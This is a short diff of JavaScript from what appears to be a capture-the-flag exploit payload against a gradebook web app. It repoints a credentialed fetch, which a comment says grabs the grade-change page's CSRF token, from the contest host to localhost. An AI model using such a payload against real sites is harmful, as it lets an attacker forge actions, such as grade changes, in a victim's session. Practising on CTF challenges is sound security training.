@@ -10,7 +10,7 @@
         }
 
         // First, fetch the grade-change page to get CSRF token
-        fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
+        fetch('localhost:4747/grade-change', {
             credentials: 'include'
         })
         .then(response => response.text())
